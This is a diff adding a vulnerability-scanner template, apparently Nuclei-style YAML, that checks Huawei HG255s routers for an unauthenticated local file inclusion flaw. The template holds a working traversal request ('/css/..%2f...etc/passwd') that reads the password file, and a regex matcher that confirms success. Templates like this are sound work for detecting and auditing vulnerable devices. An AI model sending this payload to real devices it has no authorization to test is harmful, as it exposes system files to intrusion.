@@ -1,0 +1,29 @@
+id: "huawei-hg255s-lfi"
+name: "Huawei HG255s - Local File Inclusion"
+severity: "high"
+description: "Huawei HG255s is vulnerable to local file inclusion due to insufficient validation of the received HTTP requests. A remote attacker may access the local files on the device without authentication."
+tech:
+  - "generic"
+tags:
+  - "huawei"
+  - "lfi"
+  - "router"
+  - "vuln"
+cwe: "CWE-23"
+reference: "https://cxsecurity.com/issue/WLB-2017090053"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "regex"
+    part: "body"
+    regex:
+      - "root:[x*]:0:0"
+  - type: "status"
+    status:
+      - 200
